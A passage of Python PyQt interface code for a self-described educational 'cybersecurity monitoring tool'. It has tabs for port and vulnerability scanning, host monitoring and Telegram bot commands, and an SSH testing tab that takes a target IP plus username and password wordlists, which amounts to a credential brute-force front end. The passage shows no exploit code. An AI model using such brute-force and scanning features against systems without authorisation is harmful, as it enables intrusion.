        self.create_status_bar()
        
        # Create central widget with tabs
        self.tab_widget = QTabWidget()
        self.tab_widget.setDocumentMode(True)
        self.tab_widget.setTabPosition(QTabWidget.North)
        self.tab_widget.setMovable(True)
        self.setCentralWidget(self.tab_widget)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_command_tab()
        self.create_ssh_tab()
        self.create_monitoring_tab()
        self.create_security_tab()
        self.create_telegram_tab()
        self.create_config_tab()
        self.create_logs_tab()
        
        # Create system tray icon
        self.create_system_tray()
        
        # Apply styles
        self.apply_styles()
    
    def create_menu_bar(self):
        """Create the application menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu('&File')
        
        new_action = QAction('&New Project', self)
        new_action.setShortcut('Ctrl+N')
        file_menu.addAction(new_action)
        
        open_action = QAction('&Open', self)
        open_action.setShortcut('Ctrl+O')
        file_menu.addAction(open_action)
        
        save_action = QAction('&Save', self)
        save_action.setShortcut('Ctrl+S')
        file_menu.addAction(save_action)
        
        file_menu.addSeparator()
        
        export_action = QAction('&Export Report', self)
        file_menu.addAction(export_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction('&Exit', self)
        exit_action.setShortcut('Ctrl+Q')
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Tools menu
        tools_menu = menubar.addMenu('&Tools')
        
        network_tools = tools_menu.addMenu('&Network Tools')
        ping_action = QAction('&Ping Tool', self)
        network_tools.addAction(ping_action)
        
        port_scan_action = QAction('&Port Scanner', self)
        network_tools.addAction(port_scan_action)
        
        security_tools = tools_menu.addMenu('&Security Tools')
        vuln_scan_action = QAction('&Vulnerability Scanner', self)
        security_tools.addAction(vuln_scan_action)
        
        # View menu
        view_menu = menubar.addMenu('&View')
        
        theme_menu = view_menu.addMenu('&Theme')
        dark_theme_action = QAction('&Dark Theme', self)
        dark_theme_action.triggered.connect(lambda: self.apply_dark_theme())
        theme_menu.addAction(dark_theme_action)
        
        light_theme_action = QAction('&Light Theme', self)
        light_theme_action.triggered.connect(lambda: self.apply_light_theme())
        theme_menu.addAction(light_theme_action)
        
        blue_theme_action = QAction('&Blue Theme', self)
        blue_theme_action.triggered.connect(lambda: self.apply_blue_theme())
        theme_menu.addAction(blue_theme_action)
        
        # Settings menu
        settings_menu = menubar.addMenu('&Settings')
        
        preferences_action = QAction('&Preferences', self)
        settings_menu.addAction(preferences_action)
        
        config_action = QAction('&Configuration', self)
        settings_menu.addAction(config_action)
        
        # Help menu
        help_menu = menubar.addMenu('&Help')
        
        docs_action = QAction('&Documentation', self)
        help_menu.addAction(docs_action)
        
        about_action = QAction('&About', self)
        about_action.triggered.connect(self.show_about_dialog)
        help_menu.addAction(about_action)
    
    def create_toolbar(self):
        """Create the main toolbar"""
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(24, 24))
        toolbar.setMovable(False)
        self.addToolBar(toolbar)
        
        # Add toolbar actions
        start_monitor_action = QAction('🚀 Start Monitoring', self)
        start_monitor_action.triggered.connect(self.start_all_monitoring)
        toolbar.addAction(start_monitor_action)
        
        stop_monitor_action = QAction('🛑 Stop Monitoring', self)
        stop_monitor_action.triggered.connect(self.stop_all_monitoring)
        toolbar.addAction(stop_monitor_action)
        
        toolbar.addSeparator()
        
        telegram_test_action = QAction('📱 Test Telegram', self)
        telegram_test_action.triggered.connect(self.test_telegram_connection)
        toolbar.addAction(telegram_test_action)
        
        quick_scan_action = QAction('🔍 Quick Scan', self)
        quick_scan_action.triggered.connect(self.quick_security_scan)
        toolbar.addAction(quick_scan_action)
        
        toolbar.addSeparator()
        
        report_action = QAction('📊 Generate Report', self)
        report_action.triggered.connect(self.generate_report)
        toolbar.addAction(report_action)
    
    def create_status_bar(self):
        """Create the status bar"""
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        
        # Add permanent widgets to status bar
        self.cpu_label = QLabel("CPU: --%")
        self.memory_label = QLabel("Memory: --%")
        self.network_label = QLabel("Network: --")
        self.telegram_label = QLabel("Telegram: ❌")
        
        self.status_bar.addPermanentWidget(self.cpu_label)
        self.status_bar.addPermanentWidget(self.memory_label)
        self.status_bar.addPermanentWidget(self.network_label)
        self.status_bar.addPermanentWidget(self.telegram_label)
        
        self.status_bar.showMessage("Ready")
    
    def create_dashboard_tab(self):
        """Create the dashboard tab"""
        dashboard_tab = QWidget()
        layout = QVBoxLayout()
        
        # Welcome section
        welcome_group = QGroupBox("🔒 Cybersecurity Monitoring Dashboard")
        welcome_layout = QVBoxLayout()
        
        welcome_text = QLabel(
            "<h1>Advanced Cybersecurity Monitoring Tool</h1>"
            "<p>Professional security monitoring and testing platform</p>"
            "<p>Version 2.0 | Educational Use Only</p>"
        )
        welcome_text.setAlignment(Qt.AlignCenter)
        welcome_layout.addWidget(welcome_text)
        
        welcome_group.setLayout(welcome_layout)
        layout.addWidget(welcome_group)
        
        # Quick stats
        stats_group = QGroupBox("📊 Quick Statistics")
        stats_layout = QHBoxLayout()
        
        # System stats
        system_stats = QVBoxLayout()
        self.system_info_label = QLabel("System: Loading...")
        self.cpu_usage_label = QLabel("CPU Usage: --%")
        self.memory_usage_label = QLabel("Memory Usage: --%")
        
        system_stats.addWidget(self.system_info_label)
        system_stats.addWidget(self.cpu_usage_label)
        system_stats.addWidget(self.memory_usage_label)
        stats_layout.addLayout(system_stats)
        
        # Monitoring stats
        monitor_stats = QVBoxLayout()
        self.monitored_hosts_label = QLabel("Monitored Hosts: 0")
        self.active_scans_label = QLabel("Active Scans: 0")
        self.telegram_status_label = QLabel("Telegram: Not Connected")
        
        monitor_stats.addWidget(self.monitored_hosts_label)
        monitor_stats.addWidget(self.active_scans_label)
        monitor_stats.addWidget(self.telegram_status_label)
        stats_layout.addLayout(monitor_stats)
        
        # Security stats
        security_stats = QVBoxLayout()
        self.vulnerabilities_label = QLabel("Vulnerabilities Found: 0")
        self.ssh_attempts_label = QLabel("SSH Tests: 0")
        self.ports_scanned_label = QLabel("Ports Scanned: 0")
        
        security_stats.addWidget(self.vulnerabilities_label)
        security_stats.addWidget(self.ssh_attempts_label)
        security_stats.addWidget(self.ports_scanned_label)
        stats_layout.addLayout(security_stats)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Quick actions
        actions_group = QGroupBox("⚡ Quick Actions")
        actions_layout = QHBoxLayout()
        
        quick_scan_btn = QPushButton("🔍 Quick Network Scan")
        quick_scan_btn.clicked.connect(self.quick_network_scan)
        actions_layout.addWidget(quick_scan_btn)
        
        monitor_btn = QPushButton("👁️ Add Monitoring")
        monitor_btn.clicked.connect(self.quick_add_monitoring)
        actions_layout.addWidget(monitor_btn)
        
        telegram_btn = QPushButton("🤖 Setup Telegram")
        telegram_btn.clicked.connect(self.quick_telegram_setup)
        actions_layout.addWidget(telegram_btn)
        
        report_btn = QPushButton("📊 Generate Report")
        report_btn.clicked.connect(self.generate_report)
        actions_layout.addWidget(report_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Recent activity
        activity_group = QGroupBox("📝 Recent Activity")
        activity_layout = QVBoxLayout()
        
        self.activity_list = QListWidget()
        activity_layout.addWidget(self.activity_list)
        
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group)
        
        dashboard_tab.setLayout(layout)
        self.tab_widget.addTab(dashboard_tab, "🏠 Dashboard")
    
    def create_command_tab(self):
        """Create the command console tab"""
        command_tab = QWidget()
        layout = QVBoxLayout()
        
        # Command input with history
        input_group = QGroupBox("💻 Command Console")
        input_layout = QVBoxLayout()
        
        # Command history buttons
        history_layout = QHBoxLayout()
        self.clear_history_btn = QPushButton("Clear History")
        self.clear_history_btn.clicked.connect(self.clear_command_history)
        history_layout.addWidget(self.clear_history_btn)
        
        self.search_history_btn = QPushButton("Search History")
        self.search_history_btn.clicked.connect(self.search_command_history)
        history_layout.addWidget(self.search_history_btn)
        
        history_layout.addStretch()
        input_layout.addLayout(history_layout)
        
        # Command input
        command_input_layout = QHBoxLayout()
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText(
            "Enter command (type 'help' for available commands, ↑↓ for history)"
        )
        self.command_input.returnPressed.connect(self.execute_command)
        command_input_layout.addWidget(self.command_input)
        
        self.execute_button = QPushButton("Execute")
        self.execute_button.clicked.connect(self.execute_command)
        command_input_layout.addWidget(self.execute_button)
        
        input_layout.addLayout(command_input_layout)
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Output display
        output_group = QGroupBox("📋 Output")
        output_layout = QVBoxLayout()
        
        self.output_display = QTextEdit()
        self.output_display.setReadOnly(True)
        
        # Add syntax highlighter
        self.syntax_highlighter = SyntaxHighlighter(self.output_display.document())
        
        output_layout.addWidget(self.output_display)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        # Welcome message
        self.output_display.append("🔒 Advanced Cybersecurity Monitoring Tool - Professional Edition")
        self.output_display.append("Type 'help' for available commands\n")
        
        command_tab.setLayout(layout)
        self.tab_widget.addTab(command_tab, "💻 Command Console")
    
    def create_ssh_tab(self):
        """Create the SSH testing tab"""
        ssh_tab = QWidget()
        layout = QVBoxLayout()
        
        # Target configuration
        target_group = QGroupBox("🎯 SSH Target Configuration")
        target_layout = QFormLayout()
        
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("192.168.1.1")
        target_layout.addRow("Target IP:", self.ip_input)
        
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(22)
        target_layout.addRow("SSH Port:", self.port_input)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Credentials configuration
        creds_group = QGroupBox("🔑 Credentials")
        creds_layout = QVBoxLayout()
        
        # Username file
        user_layout = QHBoxLayout()
        user_layout.addWidget(QLabel("Username List:"))
        self.user_file_input = QLineEdit()
        self.user_file_input.setPlaceholderText("Path to username wordlist")
        user_layout.addWidget(self.user_file_input)
        self.user_file_button = QPushButton("Browse...")
        self.user_file_button.clicked.connect(self.browse_user_file)
        user_layout.addWidget(self.user_file_button)
        creds_layout.addLayout(user_layout)
        
        # Password file
        pass_layout = QHBoxLayout()
        pass_layout.addWidget(QLabel("Password List:"))
        self.pass_file_input = QLineEdit()
        self.pass_file_input.setPlaceholderText("Path to password wordlist")
        pass_layout.addWidget(self.pass_file_input)
        self.pass_file_button = QPushButton("Browse...")
        self.pass_file_button.clicked.connect(self.browse_pass_file)
        pass_layout.addWidget(self.pass_file_button)
        creds_layout.addLayout(pass_layout)
        
        creds_group.setLayout(creds_layout)
        layout.addWidget(creds_group)
        
        # Options
        options_group = QGroupBox("⚙️ Options")
        options_layout = QHBoxLayout()
        
        options_layout.addWidget(QLabel("Threads:"))
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, MAX_THREADS)
        self.threads_input.setValue(3)
        options_layout.addWidget(self.threads_input)
        
        options_layout.addWidget(QLabel("Delay (s):"))
        self.delay_input = QSpinBox()
        self.delay_input.setRange(1, 30)
        self.delay_input.setValue(5)
        options_layout.addWidget(self.delay_input)
        
        options_layout.addStretch()
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Progress
        progress_group = QGroupBox("📊 Progress")
        progress_layout = QVBoxLayout()
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        progress_layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("Ready")
        progress_layout.addWidget(self.status_label)
        
        progress_group.setLayout(progress_layout)
        layout.addWidget(progress_group)
        
        # Control buttons
        button_layout = QHBoxLayout()
        self.start_ssh_button = QPushButton("🚀 Start SSH Test")
        self.start_ssh_button.clicked.connect(self.start_ssh_test)
        button_layout.addWidget(self.start_ssh_button)
        
        self.stop_ssh_button = QPushButton("🛑 Stop Test")
        self.stop_ssh_button.clicked.connect(self.stop_ssh_test)
        self.stop_ssh_button.setEnabled(False)
        button_layout.addWidget(self.stop_ssh_button)
        
        self.export_ssh_button = QPushButton("💾 Export Results")
        self.export_ssh_button.clicked.connect(self.export_ssh_results)
        button_layout.addWidget(self.export_ssh_button)
        
        layout.addLayout(button_layout)
        
        # Results display
        results_group = QGroupBox("📋 Results")
        results_layout = QVBoxLayout()
        
        self.ssh_results_display = QTextEdit()
        self.ssh_results_display.setReadOnly(True)
        results_layout.addWidget(self.ssh_results_display)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        ssh_tab.setLayout(layout)
        self.tab_widget.addTab(ssh_tab, "🔐 SSH Testing")
    
    def create_monitoring_tab(self):
        """Create the network monitoring tab"""
        monitoring_tab = QWidget()
        layout = QVBoxLayout()
        
        # Monitoring controls
        controls_group = QGroupBox("👁️ Monitoring Controls")
        controls_layout = QFormLayout()
        
        self.monitor_ip_input = QLineEdit()
        self.monitor_ip_input.setPlaceholderText("IP address to monitor")
        controls_layout.addRow("IP Address:", self.monitor_ip_input)
        
        # Monitor type
        self.monitor_type_combo = QComboBox()
        self.monitor_type_combo.addItems(["ping", "tcp", "http"])
        controls_layout.addRow("Monitor Type:", self.monitor_type_combo)
        
        # Interval
        self.monitor_interval_input = QSpinBox()
        self.monitor_interval_input.setRange(10, 3600)
        self.monitor_interval_input.setValue(30)
        self.monitor_interval_input.setSuffix(" seconds")
        controls_layout.addRow("Check Interval:", self.monitor_interval_input)
        
        # Alerts checkbox
        self.alerts_checkbox = QCheckBox("Enable Telegram alerts")
        self.alerts_checkbox.setChecked(True)
        controls_layout.addRow("Alerts:", self.alerts_checkbox)
        
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Action buttons
        monitor_buttons_layout = QHBoxLayout()
        self.start_monitor_button = QPushButton("➕ Start Monitoring")
        self.start_monitor_button.clicked.connect(self.start_monitoring_gui)
        monitor_buttons_layout.addWidget(self.start_monitor_button)
        
        self.stop_monitor_button = QPushButton("🗑️ Stop Selected")
        self.stop_monitor_button.clicked.connect(self.stop_selected_monitoring)
        monitor_buttons_layout.addWidget(self.stop_monitor_button)
        
        self.stop_all_monitor_button = QPushButton("🛑 Stop All Monitoring")
        self.stop_all_monitor_button.clicked.connect(self.stop_all_monitoring)
        monitor_buttons_layout.addWidget(self.stop_all_monitor_button)
        
        layout.addLayout(monitor_buttons_layout)
        
        # Monitored hosts table
        table_group = QGroupBox("📊 Monitored Hosts")
        table_layout = QVBoxLayout()
        
        self.monitored_table = QTableWidget()
        self.monitored_table.setColumnCount(5)
        self.monitored_table.setHorizontalHeaderLabels([
            "IP Address", "Type", "Status", "Last Check", "Changes"
        ])
        self.monitored_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        table_layout.addWidget(self.monitored_table)
        
        table_group.setLayout(table_layout)
        layout.addWidget(table_group)
        
        # Status display
        status_group = QGroupBox("📝 Monitoring Log")
        status_layout = QVBoxLayout()
        
        self.monitor_status_display = QTextEdit()
        self.monitor_status_display.setReadOnly(True)
        status_layout.addWidget(self.monitor_status_display)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        monitoring_tab.setLayout(layout)
        self.tab_widget.addTab(monitoring_tab, "👁️ Network Monitoring")
    
    def create_security_tab(self):
        """Create the security scanning tab"""
        security_tab = QWidget()
        layout = QVBoxLayout()
        
        # Scan configuration
        scan_config_group = QGroupBox("🔍 Scan Configuration")
        scan_config_layout = QFormLayout()
        
        self.scan_target_input = QLineEdit()
        self.scan_target_input.setPlaceholderText("IP address or hostname")
        scan_config_layout.addRow("Target:", self.scan_target_input)
        
        self.scan_type_combo = QComboBox()
        self.scan_type_combo.addItems(["Port Scan", "Vulnerability Scan", "Quick Security Audit"])
        scan_config_layout.addRow("Scan Type:", self.scan_type_combo)
        
        # Port range for port scans
        self.port_range_input = QLineEdit()
        self.port_range_input.setPlaceholderText("1-1000")
        self.port_range_input.setText("1-1000")
        scan_config_layout.addRow("Port Range:", self.port_range_input)
        
        # Threads
        self.scan_threads_input = QSpinBox()
        self.scan_threads_input.setRange(1, 100)
        self.scan_threads_input.setValue(20)
        scan_config_layout.addRow("Threads:", self.scan_threads_input)
        
        scan_config_group.setLayout(scan_config_layout)
        layout.addWidget(scan_config_group)
        
        # Scan controls
        scan_controls_layout = QHBoxLayout()
        self.start_scan_button = QPushButton("🚀 Start Scan")
        self.start_scan_button.clicked.connect(self.start_security_scan)
        scan_controls_layout.addWidget(self.start_scan_button)
        
        self.stop_scan_button = QPushButton("🛑 Stop Scan")
        self.stop_scan_button.clicked.connect(self.stop_security_scan)
        self.stop_scan_button.setEnabled(False)
        scan_controls_layout.addWidget(self.stop_scan_button)
        
        self.export_scan_button = QPushButton("💾 Export Results")
        self.export_scan_button.clicked.connect(self.export_scan_results)
        scan_controls_layout.addWidget(self.export_scan_button)
        
        layout.addLayout(scan_controls_layout)
        
        # Progress
        scan_progress_group = QGroupBox("📊 Scan Progress")
        scan_progress_layout = QVBoxLayout()
        
        self.scan_progress_bar = QProgressBar()
        self.scan_progress_bar.setRange(0, 100)
        scan_progress_layout.addWidget(self.scan_progress_bar)
        
        self.scan_status_label = QLabel("Ready to scan")
        scan_progress_layout.addWidget(self.scan_status_label)
        
        scan_progress_group.setLayout(scan_progress_layout)
        layout.addWidget(scan_progress_group)
        
        # Results
        scan_results_group = QGroupBox("📋 Scan Results")
        scan_results_layout = QVBoxLayout()
        
        self.scan_results_display = QTextEdit()
        self.scan_results_display.setReadOnly(True)
        scan_results_layout.addWidget(self.scan_results_display)
        
        scan_results_group.setLayout(scan_results_layout)
        layout.addWidget(scan_results_group)
        
        security_tab.setLayout(layout)
        self.tab_widget.addTab(security_tab, "🔍 Security Scanning")
    
    def create_telegram_tab(self):
        """Create the Telegram integration tab"""
        telegram_tab = QWidget()
        layout = QVBoxLayout()
        
        # Configuration
        config_group = QGroupBox("🤖 Telegram Bot Configuration")
        config_layout = QFormLayout()
        
        self.telegram_token_input = QLineEdit()
        self.telegram_token_input.setPlaceholderText("Your Telegram bot token")
        config_layout.addRow("Bot Token:", self.telegram_token_input)
        
        self.telegram_chat_id_input = QLineEdit()
        self.telegram_chat_id_input.setPlaceholderText("Your Telegram chat ID")
        config_layout.addRow("Chat ID:", self.telegram_chat_id_input)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Connection controls
        connection_layout = QHBoxLayout()
        self.test_telegram_button = QPushButton("🔗 Test Connection")
        self.test_telegram_button.clicked.connect(self.test_telegram_connection)
        connection_layout.addWidget(self.test_telegram_button)
        
        self.start_polling_button = QPushButton("🔄 Start Polling")
        self.start_polling_button.clicked.connect(self.start_telegram_polling)
        connection_layout.addWidget(self.start_polling_button)
        
        self.stop_polling_button = QPushButton("⏹️ Stop Polling")
        self.stop_polling_button.clicked.connect(self.stop_telegram_polling)
        self.stop_polling_button.setEnabled(False)
        connection_layout.addWidget(self.stop_polling_button)
        
        layout.addLayout(connection_layout)
        
        # Command configuration
        commands_group = QGroupBox("⌨️ Telegram Commands")
        commands_layout = QVBoxLayout()
        
        self.telegram_commands_list = QListWidget()
        self.refresh_commands_list()
        commands_layout.addWidget(self.telegram_commands_list)
        
        # Command buttons
        command_buttons_layout = QHBoxLayout()
        self.add_command_button = QPushButton("➕ Add Command")
        self.add_command_button.clicked.connect(self.add_telegram_command)
        command_buttons_layout.addWidget(self.add_command_button)
        
        self.edit_command_button = QPushButton("✏️ Edit Command")
        self.edit_command_button.clicked.connect(self.edit_telegram_command)
        command_buttons_layout.addWidget(self.edit_command_button)
        
        self.remove_command_button = QPushButton("🗑️ Remove Command")
        self.remove_command_button.clicked.connect(self.remove_telegram_command)
        command_buttons_layout.addWidget(self.remove_command_button)
        
        commands_layout.addLayout(command_buttons_layout)
        commands_group.setLayout(commands_layout)
        layout.addWidget(commands_group)
        
        # Message log
        message_group = QGroupBox("📨 Message Log")
        message_layout = QVBoxLayout()
        
        self.telegram_message_display = QTextEdit()
        self.telegram_message_display.setReadOnly(True)
        message_layout.addWidget(self.telegram_message_display)
        
        message_group.setLayout(message_layout)
        layout.addWidget(message_group)
        
        telegram_tab.setLayout(layout)
        self.tab_widget.addTab(telegram_tab, "🤖 Telegram Integration")
    
    def create_config_tab(self):
        """Create the configuration tab"""
        config_tab = QWidget()
        layout = QVBoxLayout()
        
        # General settings
        general_group = QGroupBox("⚙️ General Settings")
        general_layout = QFormLayout()
        
        self.auto_save_config = QCheckBox("Auto-save configuration")
        self.auto_save_config.setChecked(True)
        general_layout.addRow("Auto Save:", self.auto_save_config)
        
        self.start_minimized = QCheckBox("Start minimized to system tray")
        general_layout.addRow("Start Minimized:", self.start_minimized)
        
        self.enable_notifications = QCheckBox("Enable desktop notifications")
        self.enable_notifications.setChecked(True)
        general_layout.addRow("Notifications:", self.enable_notifications)
        
        general_group.setLayout(general_layout)
        layout.addWidget(general_group)
        
        # Security settings
        security_group = QGroupBox("🔒 Security Settings")
        security_layout = QFormLayout()
        
        self.enable_encryption = QCheckBox("Enable configuration encryption")
        security_layout.addRow("Encryption:", self.enable_encryption)
        
        self.auto_clear_logs = QCheckBox("Auto-clear logs after 7 days")
        security_layout.addRow("Auto-clear Logs:", self.auto_clear_logs)
        
        self.require_auth = QCheckBox("Require authentication for sensitive operations")
        security_layout.addRow("Authentication:", self.require_auth)
        
        security_group.setLayout(security_layout)
        layout.addWidget(security_group)
        
        # Performance settings
        performance_group = QGroupBox("🚀 Performance Settings")
        performance_layout = QFormLayout()
        
        self.max_threads_input = QSpinBox()
        self.max_threads_input.setRange(1, 50)
        self.max_threads_input.setValue(10)
        performance_layout.addRow("Max Threads:", self.max_threads_input)
        
        self.scan_timeout_input = QSpinBox()
        self.scan_timeout_input.setRange(1, 60)
        self.scan_timeout_input.setValue(10)
        self.scan_timeout_input.setSuffix(" seconds")
        performance_layout.addRow("Scan Timeout:", self.scan_timeout_input)
        
        performance_group.setLayout(performance_layout)
        layout.addWidget(performance_group)
        
        # Configuration management
        config_buttons_layout = QHBoxLayout()
        self.save_config_button = QPushButton("💾 Save Configuration")
        self.save_config_button.clicked.connect(self.save_config)
        config_buttons_layout.addWidget(self.save_config_button)
        
        self.load_config_button = QPushButton("📂 Load Configuration")
        self.load_config_button.clicked.connect(self.load_config)
        config_buttons_layout.addWidget(self.load_config_button)
        
        self.reset_config_button = QPushButton("🔄 Reset to Defaults")
        self.reset_config_button.clicked.connect(self.reset_config)
        config_buttons_layout.addWidget(self.reset_config_button)
        
        layout.addLayout(config_buttons_layout)
        
        config_tab.setLayout(layout)
        self.tab_widget.addTab(config_tab, "⚙️ Configuration")
    
    def create_logs_tab(self):
        """Create the logs and activity tab"""
        logs_tab = QWidget()
        layout = QVBoxLayout()
        
        # Log controls
        controls_group = QGroupBox("📝 Log Controls")
        controls_layout = QHBoxLayout()
        
        self.log_level_combo = QComboBox()
        self.log_level_combo.addItems(["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"])
        self.log_level_combo.setCurrentText("INFO")
        self.log_level_combo.currentTextChanged.connect(self.change_log_level)
        controls_layout.addWidget(QLabel("Log Level:"))
        controls_layout.addWidget(self.log_level_combo)
        
        self.clear_logs_button = QPushButton("🗑️ Clear Logs")
        self.clear_logs_button.clicked.connect(self.clear_logs)
        controls_layout.addWidget(self.clear_logs_button)
        
        self.export_logs_button = QPushButton("💾 Export Logs")
        self.export_logs_button.clicked.connect(self.export_logs)
        controls_layout.addWidget(self.export_logs_button)
        
        self.refresh_logs_button = QPushButton("🔄 Refresh")
        self.refresh_logs_button.clicked.connect(self.refresh_logs)
        controls_layout.addWidget(self.refresh_logs_button)
        
        controls_layout.addStretch()
        controls_group.setLayout(controls_layout)
        layout.addWidget(controls_group)
        
        # Log display
        logs_group = QGroupBox("📋 Application Logs")
        logs_layout = QVBoxLayout()
        
        self.logs_display = QTextEdit()
        self.logs_display.setReadOnly(True)
        logs_layout.addWidget(self.logs_display)
        
        logs_group.setLayout(logs_layout)
        layout.addWidget(logs_group)
        
        # Load initial logs
        self.refresh_logs()
        
        logs_tab.setLayout(layout)
        self.tab_widget.addTab(logs_tab, "📋 Logs & Activity")
    
    def create_system_tray(self):
        """Create system tray icon and menu"""
        if not QSystemTrayIcon.isSystemTrayAvailable():
            return
        
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        
        show_action = tray_menu.addAction("Show")
        show_action.triggered.connect(self.show)
        
        hide_action = tray_menu.addAction("Hide")
        hide_action.triggered.connect(self.hide)
        
        tray_menu.addSeparator()
        
        quit_action = tray_menu.addAction("Quit")
        quit_action.triggered.connect(self.quit_application)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
        self.tray_icon.activated.connect(self.tray_icon_activated)
    
    def apply_modern_theme(self):
        """Apply modern dark theme"""
        self.apply_dark_theme()
    
    def apply_dark_theme(self):
        """Apply dark theme"""
        dark_palette = QPalette()
        
        # Base colors
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        
        # Additional styling
        self.setStyleSheet("""
            QMainWindow {
                background-color: #353535;
            }
            QTabWidget::pane {
                border: 1px solid #555555;
                background-color: #2b2b2b;
            }
            QTabBar::tab {
                background-color: #404040;
                color: white;
                padding: 8px 16px;
                margin: 2px;
                border: 1px solid #555555;
                border-radius: 4px;
            }
            QTabBar::tab:selected {
                background-color: #2a82da;
            }
            QTabBar::tab:hover:!selected {
                background-color: #505050;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #555555;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QTextEdit, QLineEdit, QSpinBox, QComboBox {
                background-color: #1a1a1a;
                color: white;
                border: 1px solid #555555;
                border-radius: 3px;
                padding: 5px;
            }
            QPushButton {
                background-color: #404040;
                color: white;
                border: 1px solid #555555;
                border-radius: 3px;
                padding: 5px 10px;
            }
            QPushButton:hover {
                background-color: #505050;
            }
            QPushButton:pressed {
                background-color: #2a82da;
            }
            QProgressBar {
                border: 1px solid #555555;
                border-radius: 3px;
                text-align: center;
                background-color: #1a1a1a;
                color: white;
            }
            QProgressBar::chunk {
                background-color: #2a82da;
                border-radius: 2px;
            }
            QListWidget, QTableWidget {
                background-color: #1a1a1a;
                color: white;
                border: 1px solid #555555;
                border-radius: 3px;
            }
            QHeaderView::section {
                background-color: #404040;
                color: white;
                padding: 5px;
                border: 1px solid #555555;
            }
        """)
    
    def apply_light_theme(self):
        """Apply light theme"""
        light_palette = QPalette()
        self.setPalette(light_palette)
        self.setStyleSheet("")
    
    def apply_blue_theme(self):
        """Apply blue theme"""
        blue_palette = QPalette()
        blue_palette.setColor(QPalette.Window, QColor(240, 245, 255))
        blue_palette.setColor(QPalette.WindowText, Qt.black)
        blue_palette.setColor(QPalette.Base, QColor(255, 255, 255))
        blue_palette.setColor(QPalette.AlternateBase, QColor(240, 245, 255))
        blue_palette.setColor(QPalette.ToolTipBase, QColor(255, 255, 255))
        blue_palette.setColor(QPalette.ToolTipText, Qt.black)
        blue_palette.setColor(QPalette.Text, Qt.black)
        blue_palette.setColor(QPalette.Button, QColor(240, 245, 255))
        blue_palette.setColor(QPalette.ButtonText, Qt.black)
        blue_palette.setColor(QPalette.BrightText, Qt.red)
        blue_palette.setColor(QPalette.Link, QColor(0, 100, 200))
        blue_palette.setColor(QPalette.Highlight, QColor(0, 100, 200))
        blue_palette.setColor(QPalette.HighlightedText, Qt.white)
        
        self.setPalette(blue_palette)
    
    def apply_styles(self):
        """Apply additional styles"""
        # Set font
        font = QFont("Segoe UI", 10)
        self.setFont(font)
        
        # Set window icon
        self.setWindowIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
    
    def setup_timers(self):
        """Setup various timers for the application"""
        # Monitoring timer
        self.monitoring_timer = QTimer()
        self.monitoring_timer.timeout.connect(self.update_monitoring_display)
        self.monitoring_timer.start(5000)  # Update every 5 seconds
        
        # System monitor timer
        self.system_monitor_timer = QTimer()
        self.system_monitor_timer.timeout.connect(self.update_system_status)
        self.system_monitor_timer.start(2000)  # Update every 2 seconds
        
        # Telegram update timer
        self.telegram_update_timer = QTimer()
        self.telegram_update_timer.timeout.connect(self.check_telegram_updates)
        self.telegram_update_timer.start(1000)  # Check every second
    
    def setup_telegram_commands(self):
        """Setup default Telegram commands"""
        self.telegram_bot.register_command(
            "start",
            self.handle_telegram_start,
            "Start the bot and show welcome message"
        )
        self.telegram_bot.register_command(
            "help",
            self.handle_telegram_help,
            "Show available commands"
        )
        self.telegram_bot.register_command(
            "status",
            self.handle_telegram_status,
            "Show system status"
        )
        self.telegram_bot.register_command(
            "scan",
            self.handle_telegram_scan,
            "Perform security scan: /scan <ip> [ports]"
        )
        self.telegram_bot.register_command(
            "monitor",
            self.handle_telegram_monitor,
            "Monitor host: /monitor <ip>"
        )
        self.telegram_bot.save_commands()
    
    # Telegram command handlers
    def handle_telegram_start(self, args, chat_id):
